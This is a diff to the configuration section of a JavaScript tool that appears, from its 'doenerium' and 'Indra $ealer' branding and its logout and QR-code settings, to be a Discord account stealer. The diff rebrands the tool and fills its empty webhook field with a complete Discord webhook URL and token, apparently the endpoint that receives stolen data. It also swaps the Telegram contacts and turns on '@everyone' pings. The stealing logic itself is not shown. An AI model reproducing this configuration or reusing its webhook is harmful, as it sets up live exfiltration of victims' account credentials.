@@ -11,24 +11,24 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "Indra",
 
-    webhook: "",
+    webhook: "https://discord.com/api/webhooks/1074585152421896212/L3pm7v6igBUiipHlk3O6NortON-hCy0hhfPDcVuHtbDBC2eDrITN5Wjlirq3s7Tn_qx_",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "Indra $ealer | t.me/OwnedByIndra",
         footer: {
-            text: `doenerium | t.me/doenerium`,
+            text: `Indra $Ealer | t.me/OwnedByIndra`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/doenerium",
+        href: "https://t.me/OwnedByIndra",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
